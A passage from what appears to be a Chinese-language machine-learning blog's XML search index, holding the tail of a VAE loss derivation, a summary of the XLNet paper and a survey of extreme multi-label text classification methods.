p(z|x)log\frac{p(z|x)}{q(z)}]dz\\
&amp;=E_{x\sim p(x)}[E_{z\sim p(z|x)}(-log(q(x|z)))+KL(p(z|x)||q(z))]
\end{align}
\]</span> 最小化 KL 与最小化<span class="math inline"> \(\mathcal{L}\)</span> 等价。进而得到了 VAE 的损失函数。只不过与原论文中的符号有些出入，将最后的 KL 项的 p 与 q 调换，即得到了论文中 VAE 的损失函数：
<span class="math display">\[
\mathcal{L}=E_{x\sim p(x)}[E_{z\sim
p(z|x)}(-log(q(x|z)))+KL(q(z|x)||p(z))]
\]</span> 符号的差别是由于论文直接引入的<span class="math inline"> \(q(z|x)\)</span>，而这里引入的是联合概率分布<span class="math inline"> \(q(x,z)\)</span>。</p>
<p>注意上面的<span class="math inline"> \(\mathcal
L\)</span> 是损失函数，而不是<strong>变分下界 ELBO</strong>，VAE 的 ELBO 是损失函数的相反数，引用 VAE 原文中的公式：
<span class="math display">\[
\mathcal{L}(\theta,\phi;x^{(i)})=-D_{KL}(q_\phi(z|x^{(i)})||p(z))+\mathbb
E_{q_\phi(z|x^{(i)})}[-log(p_\theta(x^{(i)}|z))]
\]</span></p>
<p><strong>ELBO 是要最大化的，而损失函数是要最小化的</strong>。上面的 ELBO 是单个样本的公式，没有对所有样本计算期望，所以形式上有所差异。</p>
<h3 id="说明">说明</h3>
<p>值得注意的是，VAE 的两个损失函数项并不是割裂的。换而言之，VAE 并不是独立地优化每项损失。这很容易理解，如果 VAE 独立优化第二项损失至最小，<span class="math inline">\(p(z)=q(z|x)\)</span>，那么<span class="math inline"> \(q(z|x)\)</span> 将不具备任何<span class="math inline"> \(x\)</span> 的信息，这显然会使得第一项重构损失很大。同理，如果第一项重构损失很小，就意味着<span class="math inline"> \(q(z|x)\)</span> 包含了过多<span class="math inline"> \(x\)</span> 的信息，与<span class="math inline"> \(p(z)\)</span> 的差异（即 KL 项）就会很大。因此，VAE 是在两项损失的相互作用下，取得一个最优解。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://kexue.fm/archives/5253">变分自编码器（一）：原来是这么一回事
- 科学空间</a></li>
<li><a href="https://kexue.fm/archives/5343">变分自编码器（二）：从贝叶斯观点出发
- 科学空间</a></li>
<li><a href="https://kexue.fm/archives/5383">变分自编码器（三）：这样做为什么能成？
- 科学空间</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>生成模型</category>
      </categories>
      <tags>
        <tag>VAE</tag>
        <tag>生成模型</tag>
      </tags>
  </entry>
  <entry>
    <title>XLNET：基于置换语言任务的自回归模型</title>
    <url>/blog/2022/04/17/XLNET/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>XLNET 是由卡耐基梅隆大学和谷歌于 2019 年提出的<strong>自回归预训练模型</strong>，论文名为《XLNet:
Generalized Autoregressive Pretraining for Language
Understanding》，收录于 2019
NIPS 中。其动机是为了解决 BERT 面临的两个问题：忽视了 <strong>[MASK]
token 间的依赖关系</strong>以及 [MASK] 导致的<strong>预训练 - 微调差异</strong>。
XLNet 在 20 项任务上的表现优于
BERT，通常大幅度提高，包括问答、自然语言推理、情感分析和文档排序。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<h3 id="自编码vs自回归">自编码 vs 自回归</h3>
<p>预训练模型常在大规模语料上，通过构建无监督的预训练目标进行训练。其中，自回归
(AR) 语言建模和自编码 (AE) 是两个最成功的预训练目标。</p>
<p>自编码方法旨在通过从被破坏的输入重建数据，典型的例子为 BERT 的掩码语言模型（MLM），将若干 token 掩码为 [MASK]，通过上下文的其他 token 预测被掩码的 token。类似完形填空任务，将 “我吃饭了” 掩码为 "我吃 [MASK] 了"，预测 [MASK] 为 "饭"。但 BERT 的缺点在于，它对于多个 [MASK] 标记分开预测，换而言之，<strong>假设它们是互相独立的，没有考虑它们间的依赖关系</strong>。而且，在预训练过程中，[MASK] 的 token
embedding 为空，对其后续的上下文表征没有任何帮助。而在下游微调任务中，当前 token 的 token
embedding 对其上下文表征是最重要的。这就导致了上下游间的差异。</p>
<p>自回归的方法旨在使用自回归模型拟合语料的概率分布，典型的例子为 GPT 的语言模型。将句子概率<span class="math inline"> \(p(x)\)</span> 分解为条件概率的乘积，即<span class="math inline"> \(p(x)=\prod_t
p(x_t|x_{&lt;t})\)</span>。这种方法非常符合人的认知，但是缺点是无法利用双向的上下文信息。而双向的上下文信息对于下游的理解任务是至关重要的。</p>
<p>XLNET 希望将 AR 和 AE 的优点结合起来，避免它们的局限性。XLNET 提出了一种名为置换语言模型的预训练目标，即<strong>打乱句子的 token 顺序并使用自回归的方法预测</strong>。这种方法不依赖于掩码、结合了双向上下文信息、自回归训练。XLNet
在许多下游任务上比 BERT 表现出色，包括 GLUE 语言理解任务、阅读理解任务（如
SQuAD 和
RACE），Yelp 和 IMDB 等文本分类任务，以及 ClueWeb09-B 文档排名任务。</p>
<h2 id="方法">方法</h2>
<h3 id="置换语言模型">置换语言模型</h3>
<p>对于长度为<span class="math inline"> \(T\)</span> 的序列<span class="math inline"> \(x\)</span>，存在<span class="math inline"> \(T!\)</span> 种排列可用于自回归生成。用<span class="math inline"> \(\mathcal Z_T\)</span> 代表所有长度为<span class="math inline"> \(T\)</span> 的序列<span class="math inline"> \([1,2,\cdots,T]\)</span> 的排列集合，<span class="math inline">\(z_t\)</span> 和<span class="math inline"> \(z_{&lt;t}\)</span> 分别代表排列<span class="math inline"> \(z\in\mathcal Z_T\)</span> 的第<span class="math inline"> \(t\)</span> 个和前<span class="math inline"> \(t-1\)</span> 个元素。置换语言模型的目标可形式化定义为：
<span class="math display">\[
\max_\theta \mathbb E_{z\sim\mathcal
Z_T}[\sum_{t=1}^Tlogp(x_{z_t}|x_{z_{&lt;t}})]
\]</span> 事实上，只需要每次随机采样一个排列序列<span class="math inline"> \(z\)</span>，优化对数似然即可。而且我们也不需要显式地改变句子顺序，只需要对 Attention 进行掩码即可。后面会介绍到。</p>
<h3 id="双流自注意力机制">双流自注意力机制</h3>
<p>虽然已经得到了形式化的训练目标，但是直接使用 Transformer-XL 优化上述目标可能是没什么用的。具体而言，如果使用标准的 softmax 计算下一个 token 的概率分布，即<span class="math inline"> \(p(X_{z_t}|x_{z_{&lt;t}})\)</span>，公式为 <span class="math display">\[
p(X_{z_t}=x|x_{z_{&lt;t}})=\frac{\exp(e(x)^Th_\theta(x_{z_{&lt;t}}))}{\sum_{x'}\exp(e(x')^Th_\theta(x_{z_{&lt;t}})}
\]</span> 其中，<strong><span class="math inline">\(h_\theta(x_{z_{&lt;t}})\)</span> 是<span class="math inline"> \(x_{z_{t}}\)</span> 的隐藏状态表征，<span class="math inline">\(e(x)\)</span> 是<span class="math inline"> \(x\)</span> 的嵌入向量。可以看到<span class="math inline"> \(h_\theta(x_{z_{&lt;t}})\)</span> 是与要预测的 token 的位置<span class="math inline"> \(z_t\)</span> 无关的。也就是</strong>无论下一个预测的 token 是哪个位置的，得到的概率分布都是相同的<strong>。这显然与我们的期望是相悖的。为了解决这个问题，需要</strong>重参数化<strong>这个概率分布，加入<span class="math inline"> \(z_t\)</span> 的信息： <span class="math display">\[
p(X_{z_t}=x|x_{z_{&lt;t}})=\frac{\exp(e(x)^Tg_\theta(x_{z_{&lt;t}},z_t))}{\sum_{x'}\exp(e(x')^Tg_\theta(x_{z_{&lt;t}},z_t)}
\]</span> 其中，</strong><span class="math inline">\(g_\theta\)</span> 是一种新的、依赖于下一个 token 位置的表征 **。</p>
<p>那么新的问题就来了，怎么建模这个<span class="math inline"> \(g_\theta\)</span> 呢？从形式上可以看出，<span class="math inline">\(g_\theta\)</span> 希望在根据位置<span class="math inline"> \(z_t\)</span> 从已有的上下文<span class="math inline"> \(x_{z_{&lt;t}}\)</span> 中通过注意力机制收集信息。这样就有了两种略显矛盾的需求：</p>
<ul>
<li>预测<span class="math inline"> \(x_{z_t}\)</span> 时，<span class="math inline">\(g_\theta(x_{z_{&lt;t}},z_t)\)</span> 只能依赖位置<span class="math inline"> \(z_t\)</span> 而非内容<span class="math inline"> \(x_{z_t}\)</span></li>
<li> 预测<span class="math inline"> \(j&gt;t\)</span> 的其他标记<span class="math inline"> \(x_{z_j}\)</span> 时，也需要<span class="math inline"> \(x_{z_t}\)</span> 的隐藏表征，此时<span class="math inline"> \(g_\theta(x_{z_{&lt;t}},z_t)\)</span> 应该编码<span class="math inline"> \(x_{z_t}\)</span> 的内容以充分利用上下文信息</li>
</ul>
<p>那么，就需要两种上下文表征：</p>
<ul>
<li><strong>内容表征</strong><span class="math inline"> \(h_\theta(x_{z_{\le t}})\)</span>，简写为<span class="math inline"> \(h_{z_{\le
t}}\)</span>，类似标准 Transformer 中的隐藏状态，同时编码上下文和位置</li>
<li><strong>查询表征</strong><span class="math inline"> \(g_\theta(x_{z_t})\)</span>，简写为<span class="math inline"> \(g_{z_t}\)</span>，只根据<span class="math inline"> \(h_{z_{&lt;t}}\)</span> 和位置<span class="math inline"> \(z_t\)</span> 计算得到</li>
</ul>
<p>为便于计算，查询流的第一层初始化为可训练的向量，即<span class="math inline"> \(g_i^{(0)}=w\)</span>，内容流初始化为嵌入向量，即<span class="math inline"> \(h_i^{(0)}=e(x_i)\)</span>。对于其它层<span class="math inline"> \(m=1,\cdots,M\)</span>，使用共享参数更新两种流的向量表征，示意图如下所示：</p>
<p><img src="two-stream.png"></p>
<ul>
<li>图 (a) 为内容流注意力，类比标准 Transformer 中的自注意力，query、key、value 均为有内容的向量表征。</li>
<li>图 (b) 为查询流注意力，不能获取当前位置的内容<span class="math inline"> \(x_{z_t}\)</span>，以其位置<span class="math inline"> \(z_t\)</span> 为 query，key、value 也均为有内容的向量表征。</li>
<li>图 (c) 为置换语言模型的训练过程。采样一个排列<span class="math inline"> \(3,2,4,1\)</span>，内容流中，1 可以看到 3,2,4，且根据 1 的内容计算双向自注意力，其 Attention 不需要遮挡；2 只能看到 3 和它本身，因此位置 1,4 需要被遮挡。以此类推。查询流与内容流类似，不过需要额外去掉当前位置的内容，即矩阵中的主对角线全部被遮挡。</li>
</ul>
<p>更新公式可以示意为（<strong>注意 KV 里下标<span class="math inline"> \(&lt;,\le\)</span> 的差异</strong>）： <span class="math display">\[
g_{z_t}^{(m)}\leftarrow
Attention(Q=g_{z_t}^{(m-1)},KV=h_{z_{&lt;t}}^{(m-1)};\theta)\\
h_{z_t}^{(m)}\leftarrow Attention(Q=h_{z_t}^{(m-1)},KV=h_{z_{\le
t}}^{(m-1)};\theta)
\]</span> 使用最后一层的<span class="math inline"> \(g_{z_t}^{(M)}\)</span> 来计算上述的条件概率<span class="math inline"> \(p(X_{z_t}=x|x_{z_{&lt;t}})\)</span>。在微调的时候，可以直接将查询流丢弃。</p>
<h3 id="部分预测">部分预测</h3>
<p>虽然上述理论很美好，但是早期实验证实其收敛很慢。很容易理解，排列中前一部分的 token 的上下文位置随机，预测下一随机位置的 token 是困难的。为了优化方便，论文只预测排列中最后一部分的 token，它们的上下文最为丰富。形式化而言，将排列<span class="math inline"> \(z\)</span> 划分为上下文<span class="math inline"> \(z_{\le c}\)</span> 和目标<span class="math inline"> \(z_{&gt; c}\)</span>，c 为切分点。使用超参数<span class="math inline"> \(|z|/(|z|-c)\approx
K\)</span> 控制这个比例。这里类似 BERT 里控制 [MASK] 比例，理论上当然是越大越好，但是太大了不易收敛。上下文部分<span class="math inline"> \(z_{\le
c}\)</span> 的查询流也不需要计算了，可以节省时间和内存。</p>
<h3 id="集成transformer-xl">集成 Transformer-XL</h3>
<p>在 Transformer-XL 的基础上，添加：</p>
<ul>
<li><strong>相对位置编码</strong></li>
<li><strong>段循环机制</strong></li>
</ul>
<p>主要介绍下段循环机制。对于过长的输入，往往需要以固定长度 T（如 512）将其分段（segment）。假设两段输入分别为<span class="math inline"> \(\tilde x=s_{1:T},x=s_{T+1:2T}\)</span>，<span class="math inline">\(\tilde z,z\)</span> 分别为其排列顺序，<span class="math inline">\(\tilde
h^{(m)}\)</span> 为 m 层的向量表征。对于段<span class="math inline"> \(x\)</span>，计算注意力时可以添加<span class="math inline"> \(\tilde
h^{(m-1)}\)</span> 的注意力，类似记忆网络（Memory Network），如下式所示：
<span class="math display">\[
h_{z_t}^{(m)}\leftarrow Attention(Q=h_{z_t}^{(m-1)},KV=[\tilde
h^{(m-1)},h_{z_{\le t}}^{(m-1)}];\theta)
\]</span> 这样可以缓存和重用前一段的模型结果。</p>
<h3 id="多段建模">多段建模</h3>
<p>许多下游任务以多个段为输入，例如问答、对话等。XLNET 参考 BERT，构建 [CLS,
A, SEP, B,
SEP] 的输入，用以进行置换语言模型训练。不过事实上，XLNET 并没有使用下句预测的预训练任务，因为它在消融实验里并没有带来帮助。</p>
<p>继承自相对位置编码的思想，XLNET 引入了<strong>相对段编码</strong>。与为每个段显式加入绝对段编码的 BERT 不同，XLNET 使用两个相对段编码<span class="math inline"> \(s_+,s_-\)</span> 衡量两个位置<span class="math inline"> \(i,j\)</span> 是否来自同一个段，<span class="math inline">\(s_+,s_-\)</span> 是每个注意力头可学习的参数。换而言之，XLNET 只考虑两个位置是否来自一个段，不关心它们来自哪两个段。当位置<span class="math inline"> \(i\)</span> 向<span class="math inline"> \(j\)</span> 计算注意力时，段编码<span class="math inline"> \(s_{ij}\)</span> 用以计算权重<span class="math inline"> \(a_{ij}=(q_i+b)^Ts_{ij}\)</span>，<span class="math inline">\(q_i\)</span> 是标准的查询向量，<span class="math inline">\(b\)</span> 为特定于注意力头的可学习的偏差向量，得到的<span class="math inline"> \(a_{ij}\)</span> 被添加到注意力 ij 间的权重上。直观而言，如果 ij 来自同一个段，这个权重应该更大，反之则更小。相较于绝对段编码，相对段编码更易扩展，而且可以提高泛化能力。</p>
<h2 id="实验">实验</h2>
<h3 id="设置">设置</h3>
<ul>
<li>预训练数据：包含 BookCorpus、Wikipedia、Giga5、ClueWeb
2012-B 等，共 126GB。BERT 只使用了前两项共 13GB。</li>
<li>参数规模：XLNET-Large 和 BERT-Large 架构一致</li>
<li>训练成本：512 块 TPU，500k 步，5.5 天，完了还是欠拟合</li>
<li> K=6，即只预测一个句子排列的末尾<span class="math inline"> \(1/6\approx 17%\)</span>，与 BERT
15% 的掩码率相近</li>
<li>微调：<strong>基于跨度的预测</strong>（span-based
prediction）。随机采用一个长度<span class="math inline"> \(L\in
[1,2,3,4,5]\)</span>，随机采样一段长为 L 的连续的跨度作为预测目标。</li>
</ul>
<h3 id="与bert的公平比较">与 BERT 的公平比较</h3>
<p>XLNET 与 BERT 在相同数据集上训练、架构一致。BERT 选取原生 BERT、全词掩码、无下句预测三种版本中的最优结果。下表为 GLUE、SQuAD 数据集的结果。可以看到在不同下游任务上，XLNET 均超越 BERT，一般一两个点。</p>
<p><img src="fair-comparison.png"></p>
<h3 id="其他结果">其他结果</h3>
<p>下面的 XLNET 就是全量数据上的结果了。</p>
<p>下表为在 RACE（阅读理解任务）和
onClueWeb09-B（文档排序任务）测试集的最新结果的比较。RACE 数据集以长度著称，考验了模型的长片段信息捕捉能力。ClueWeb09-B
文档排序数据集，主要用于测试模型生成的词向量效果。可以看到 XLNET 都是最优的。</p>
<p><img src="scaling.png"></p>
<p>下表为在 SQuAD 数据集上的结果，大幅领先 BERT，略优于 RoBERTa。</p>
<p><img src="SQuAD.png"></p>
<p>下表为在多个文本分类数据集上的实验结果，主要与 BERT 比较。</p>
<p><img src="text-classification.png"></p>
<p>下表为在 GLEU 数据集上，与 RoBERTa 等模型的比较结果。还是大幅领先 BERT，略优于 RoBERTa。</p>
<p><img src="GLEU.png"></p>
<h3 id="消融实验">消融实验</h3>
<p>消融实验旨在具体探究：</p>
<ul>
<li>置换语言模型的有效性，对比 MLM</li>
<li>Transformer-XL 架构的重要性</li>
<li>一些其他细节：基于跨度预测、双向输入、下句预测</li>
</ul>
<p>为了公平比较，所有模型都基于 12 层架构，具有与 BERT-Base
相同的模型超参数，并且仅在 Wikipedia 和 BooksCorpus
上进行训练。基线为原始的 BERT-Base 以及使用降噪自编码器（DAE）训练的 Transformer-XL。DAE 和 BERT 差别在于，BERT 只预测 [MASK] token，DAE 预测所有 token。结果如下表所示。</p>
<p><img src="ablation.png"></p>
<p>1-4 行可以看出，Tranformer-XL 和置换语言模型确实提供了性能提升。如果删去内存缓存机制（第 5 行），性能明显下降，尤其是涉及长上下文的任务。6-7 行显示，基于跨度的预测和双向输入在 XLNet 中都起着重要作用。最后，不出所料的是，下句预测在 XLNET 里也不一定会带来改进。因此 XLNET 也将其排除在预训练目标之外。</p>
<h2 id="总结">总结</h2>
<p>本文提出了一种名为置换语言模型的预训练任务及配套的预训练模型 XLNET，旨在结合自回归和自编码两种预训练目标的优点。消融实验证明，所提出的置换语言模型的预训练目标是有效的，在各项自然语言理解任务上比 BERT 取得了显著改进。不过相较于 RoBERTa 的提升不大。考虑到 RoBERTa 的<strong>可并行性</strong>，可能 NLU 任务还是偏好 RoBERTa 吧。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://zhuanlan.zhihu.com/p/71916499">飞跃芝麻街：XLNet
详解 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>自然语言处理</tag>
        <tag>XLNET</tag>
      </tags>
  </entry>
  <entry>
    <title>XMTC: 极端多标签文本分类相关工作</title>
    <url>/blog/2022/08/27/XMTC/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本博客主要总结一下近期看到的一些关于极端多标签文本分类（Extreme
Multi-Label Text Classification，XMTC）的相关工作。
之前尝试研究了一个月，发现 SOTA 复现不太出来，只能放弃了换方向了。希望这篇博客能帮到有缘人。</p>
<span id="more"></span>
<h2 id="简介">简介</h2>
<p>极端多标签文本分类（Extreme Multi-Label Text
Classification，XMTC）。给定一段文本，和极多（百、千、万乃至更多）的标签，判断文本所属的标签子集。例如，维基百科有百万级别的标签，每个百科文本都对应若干个标签。亚马逊的商品，有着复杂的垂直标签结构，标签数量也是百万级的。</p>
<h3 id="挑战">挑战</h3>
<p>XMTC 主要面临以下挑战：</p>
<ul>
<li>稀疏性：大量标签都只有少数样本与之关联，典型的长尾分布</li>
<li>计算成本高：标签数量过多，为每个标签独立训练分类器成本过高</li>
<li>可扩展性：对新增标签的可扩展性</li>
</ul>
<figure>
<img src="Untitled.png" alt="两个XMTC数据集上，只有一半或更少的标签关联至少5个实例">
<figcaption aria-hidden="true">两个 XMTC 数据集上，只有一半或更少的标签关联至少 5 个实例</figcaption>
</figure>
<p>两个 XMTC 数据集上，只有一半或更少的标签关联至少 5 个实例</p>
<h3 id="解决方法">解决方法</h3>
<p>XMTC 的方法可以分为以下四类：</p>
<p>一对多分类：为每个标签构建 OVR（one vs
rest）分类器，可以实现较高精度。但当标签数量过多时，训练、预测开销过大。</p>
<p><strong>目标嵌入的方法</strong>：标签矩阵<span class="math inline"> \(N\times
L\)</span> 中，N，L 分别为样本、标签数量。这个矩阵庞大稀疏，难以直接学习到一个可靠的映射。如果可以使用线性映射或者其他方法，完成降维<span class="math inline"> \(L \rightarrow \hat L\)</span>
，就可以学习到特征 - 降维后的标签间的可靠映射。然后再通过升维<span class="math inline"> \(\hat L \rightarrow L\)</span>
，得到真实标签。此类方法的差异主要在降维、升维技术上，例如压缩感知、奇异值分解等。</p>
<p><strong>集成树的方法</strong>：类似决策树，区别在于使用特征的加权和而非单一特征的信息增益进行划分，健壮性更好。</p>
<p><strong>深度学习方法</strong>：使用深度学习特征，而非传统的词袋、tf-idf 特征。</p>
<h3 id="数据集">数据集</h3>
<p>其中的 L 是标签数量，可以看到大型数据集上，有几十万标签，规模是很大的。</p>
<p><img src="Untitled-1.png"></p>
<h3 id="评估指标">评估指标</h3>
<p>对于文档，根据分数输出一个有序的标签列表。然后使用排序指标评估：</p>
<ul>
<li>Precision@TopK: TopK 的查准率，越高越好</li>
<li> NDCG@TopK: 归一化折损累计增益，越高越好</li>
</ul>
<h2 id="xml-cnn">XML-CNN</h2>
<p>2017，Deep Learning for Extreme Multi-label Text Classification</p>
<p>首次使用深度学习方法解决 XMTC 问题，使用 CNN + 交叉熵 loss。为了避免池化层后直接接分类线性层的参数过多，中间引入了一个较小的线性层，大小为<span class="math inline"> \(h\)</span>。</p>
<figure>
<img src="Untitled-2.png" alt="模型结构图，红色的方框为较小的线性层">
<figcaption aria-hidden="true">模型结构图，红色的方框为较小的线性层</figcaption>
</figure>
<p>模型结构图，红色的方框为较小的线性层</p>
<p>结果：在六个数据集上基本达到了 SOTA，消融实验证明 BCE 损失、动态池化、小线性层都是有效的。</p>
<h2 id="attention-xml">Attention-XML</h2>
<p>2019 AttentionXML: Label Tree-based Attention-Aware Deep Model for
High-Performance Extreme Multi-Label Text Classification</p>
<p>做法：</p>
<p>构建宽而矮的概率标签树（plt），减少错误积累</p>
<ul>
<li>首先构造初始标签树，对标签的词袋特征，自顶向下 2-means 做层次聚类，直到类别数 &lt; M</li>
<li> 对树进行压缩，得到宽而矮的概率标签树</li>
</ul>
<p>为每一层训练一个 Bi-LSTM 多分类器</p>
<ul>
<li>对每个样本，每层只使用上层该样本的 Top-C 候选的孩子节点训练，类似负采样</li>
<li>每个标签对输入序列计算 attention 得到<span class="math inline"> \(\hat
m_i\)</span>，通过共享的全连接、输出层映射到分数</li>
<li>预测的时候，使用链式法则，得到每个标签的概率分数</li>
<li>使用 BCE loss 训练，使用三棵 plt 集成取得最好性能</li>
</ul>
<p><img src="Untitled-3.png"></p>
<p>结果：未集成的 AttentionXML 已经超过了 XML-CNN 达到了 SOTA，集成后性能提升半个点或更多</p>
<h2 id="x-bert">X-BERT</h2>
<p>2019 X-BERT: eXtreme Multi-label Text Classification using
Bidirectional Encoder Representations from Transformers</p>
<p>首次将 BERT 扩展到 XMTC 任务，解决以下挑战：</p>
<ul>
<li>直接分类忽视了标签间的依赖关系、相关性</li>
<li> SoftMax 瓶颈</li>
</ul>
<p>论文提出了一个三阶段模型：</p>
<ol type="1">
<li>ELMo 编码标签描述 + tf-idf 特征，KMeans 聚类标签得到 K 个簇</li>
<li> BERT 完成 K 个簇上的多分类</li>
<li>使用一对多分类器完成簇内标签的判断</li>
</ol>
<p>在四个数据集上达到了 SOTA，未与 AttentionXML 比较</p>
<h2 id="x-transformers">X-Transformers</h2>
<p>2020，Taming Pretrained Transformers for Extreme Multi-label Text
Classification</p>
<ul>
<li>XLNET 编码标签描述 + 正样本聚合特征（Positive Instance Feature
Aggregation, PIFA），进行分层聚类</li>
</ul>
<p><img src="Untitled-4.png"></p>
<ul>
<li> BERT/RoBERTa/XLNET Large + 平方 Hinge-loss
微调聚类标签的多分类（三模型集成效果最好）</li>
<li>使用 tf-idf + 嵌入特征，构建线性 OVA 分类器，使用混合采样策略构建负样本
<ol type="1">
<li>使用聚类簇内其他标签对应的样本作为负样本</li>
<li>使用其他 Topb 聚类簇内标签样本作为负样本</li>
</ol></li>
</ul>
<p>跟 X-BERT 一批人做的，效果超过了 X-BERT，AttentionXML</p>
<h2 id="lightxml">LightXML</h2>
<p>2021 LightXML: Transformer with Dynamic Negative Sampling for
High-Performance Extreme Multi-label Text Classification</p>
<p>动机，解决 X-Transformers，Attention-XML 的以下问题：</p>
<ul>
<li>使用多个模型集成，计算资源和成本过高</li>
<li>负样本采样，降低了模型效率和准确性</li>
</ul>
<p>做法：</p>
<ul>
<li>标签聚类：使用标签的稀疏特征，构造概率标签树，与 Attention-XML 类似，但<strong>只有两层</strong>，也就是只有一层聚类结果</li>
<li>文本表示，使用 BERT/RoBERTa/XLNET base，取最后 5 层的 [CLS] 表征拼接</li>
<li>标签召回：根据文本表征完成聚类簇多分类上分数计算，采样所有正样本，由易到难地采样部分负样本</li>
<li>计算分数：根据正负样本标签嵌入、文本表征，计算分数，BCE loss</li>
</ul>
<p>训练资源：</p>
<ul>
<li>1 块 16G V100</li>
</ul>
<p><img src="Untitled-5.png"></p>
<p>数据集统计信息</p>
<p><img src="Untitled-1.png"></p>
<p>使用 3 个模型或者 3 个聚类结果进行集成</p>
<p>结果：在五个数据集上超过了 X-Transformers，达到了 SOTA。消融实验证明 5 个 cls 拼接有助于收敛，动态负采样能够提升性能</p>
<h2 id="gudn">GUDN</h2>
<p>2022，GUDN: A novel guide network for extreme multi-label text
classification</p>
<p>动机：LightXML 未使用标签语义信息</p>
<p>做法：</p>
<ul>
<li>特征提取：BERT 编码特征文本，取最后 10 层的 CLS 拼接作为标签提取的特征</li>
<li>引导网络：事实上就是辅助 loss。使用以下两种：文档表征和标签表征间的 MSE
loss；标签表征用于分类的 BCE loss</li>
<li> 分类排名：对中等数据集直接使用线性层分类；对大标签数据集使用 BOW 聚类 + 动态负采样，类似 LightXML</li>
</ul>
<p><img src="Untitled-6.png"></p>
<p>实验资源：</p>
<ul>
<li>4 块 24G 3090</li>
</ul>
<p>结果：</p>
<p>在四个数据集上基本达到了 SOTA，超过 LightXML。消融实验证明，论文提出的两个辅助 loss 是有效的。</p>
<h2 id="glo-calxml">GLO-CALXML</h2>
<p>2022，Exploiting Local and Global Features in Transformer-based
Extreme Multi-label Text Classification</p>
<p>这篇论文是目前的 SOTA，把 Eurlex-4k 数据集上的 precision 提高了 3 个点多，可惜我没有复现出来。</p>
<p>动机：传统方法只使用 CLS 作为文档表征，只有全局表征，可能缺失信息。</p>
<p>做法：</p>
<ul>
<li>每个标签有 global embedding 和 local embedding</li>
<li>global embedding 和 cls 计算全局概率，local
embedding 作为 query 与第一层所有 token
embedding 做 attention，取加权和计算局部特征的概率</li>
<li> loss：两个概率的 BCE loss 之和</li>
<li>预测：使用两个概率平均值</li>
</ul>
<p>我猜测这篇论文是从 Eurlex-4k 数据集得到的启发，该数据集由关键词组构成，并不是通顺的句子。所以编码器更高层的表征意义不大，并不存在复杂的上下文。浅层表征反而可以保留更多信息。基于此，设计一个 attention 去直接接触浅层表征是很自然的想法。而且这种 global 和 local 结合的工作印象里也挺多的，多文本分类 MLC 上好像就有。</p>
<p>实验：</p>
<ul>
<li>没有使用标签树，只在标签较少的三个数据集上进行了实验</li>
<li>使用 3 个预训练模型集成</li>
<li>在两个数据集上超过了 LightXML（只使用单模型的情况也是超过的），
与 GUDN 互有胜负</li>
<li>消融实验证明，局部特征和全局特征的融合是有效的</li>
</ul>
<p>以下是三模型集成结果，可以看出在 Eurlex-4k 和 Wiki10-31K 上分别有 3 个点、2 个点的提升，有点降维打击了。</p>
<p><img src="GLOCALXML-exper.png"></p>
<h2 id="depl">DEPL</h2>
<p>2022，Long-tailed Extreme Multi-label Text Classification with
Generated Pseudo Label Descriptions</p>
<p>动机：传统模型都使用 precision@topk 指标，该指标不能很好反应尾部标签的分类性能，论文提出使用 macro-averaged
F1@k，使得不同标签有相同的权重。</p>
<figure>
<img src="Untitled-7.png" alt="横坐标，数量由少到多的标签id，纵坐标，Macro-F1@19">
<figcaption aria-hidden="true">横坐标，数量由少到多的标签 id，纵坐标，Macro-F1@19</figcaption>
</figure>
<p>横坐标，数量由少到多的标签 id，纵坐标，Macro-F1@19</p>
<p>做法：</p>
<p>将 XMTC 定义为检索任务，根据文档检索标签。为了解决标签文本过短的问题，使用 SVM 构建分类器，并根据 token 重要性生成标签伪描述。具体来说：</p>
<ul>
<li>基于文档的 tf-id 特征 + 点积相似度函数 + hinge
loss 训练稀疏分类器，训练维度为词表大小的 label
embedding，将其中元素认为是 token 对 label 的重要性，选 topk 的 token 拼接到标签名后</li>
<li>使用 BERT 编码，文档表征选择 cls，标签表征选择最后一层的池化结果，使用点积衡量相似性</li>
<li>负采样，根据第一步分类器的 top 负样本和随机填充的负样本构建标签子集</li>
<li>融合：文档表征后接线性层，得到概率分布 A；点积相似性结果得到另一个概率分布；两者平均作为最终结果</li>
</ul>
<p>框架如下：</p>
<p><img src="Untitled-8.png"></p>
<p>评价指标：除了 P@k，Macro F1@K，还有 PSP@K，PSP@K 是加权版的 P<span class="citation" data-cites="K">@K</span>，预测正确尾部标签的收益更高</p>
<p>结果：在 Macro
F1@k，PSP@K 上达到了 SOTA，P@K 要弱一些；消融实验证明，伪标签描述对于尾部标签预测是有效的</p>
<h2 id="treaderxml">TReaderXML</h2>
<p>2022 Exploiting Dynamic and Fine-grained Semantic Scope for Extreme
Multi-label Text Classification</p>
<p>一篇比较奇怪的论文</p>
<p>动机：传统方法使用聚类获得标签簇，但是这些簇只有粗粒度的语义，难以建模具体语义</p>
<p>做法：构建细粒度的教师知识优化样本语义</p>
<p>基于层次结构假设，如果一个样本与标签 A 相关，与标签 A 的父标签也相关</p>
<ul>
<li><p>对于每个文档样本 x，遍历其他样本，找到与其余弦相似度 topk 的样本</p></li>
<li><p>将该样本对应的标签、父标签（标签树）编码平均后，得到教师知识</p></li>
<li><p>使用一个掩码多层自注意力（自左向右）、一个多头注意力层完成编码过程</p>
<p><img src="Untitled-9.png"></p></li>
</ul>
<p>损失函数：基于最大熵的多标签一对多损失</p>
<p><img src="Untitled-10.png"></p>
<p>实验结果：在两个数据集上超过 LightXML 达到了 SOTA</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://analyticsindiamag.com/what-is-extreme-multilabel-text-classification/">什么是极端多标签文本分类？
(analyticsindiamag.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/342922980">算法理论 01
SVD 奇异值分解 - 知乎 (zhihu.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>自然语言理解</category>
        <category>文本分类</category>
        <category>多标签分类</category>
      </categories>
      <tags>
        <tag>XMTC</tag>
        <tag>文本分类</tag>
        <tag>多标签</tag>
      </tags>
  </entry>
  <entry>
    <title>XV6-Lab-1 实验报告: Xv6 and Unix utilities</title>
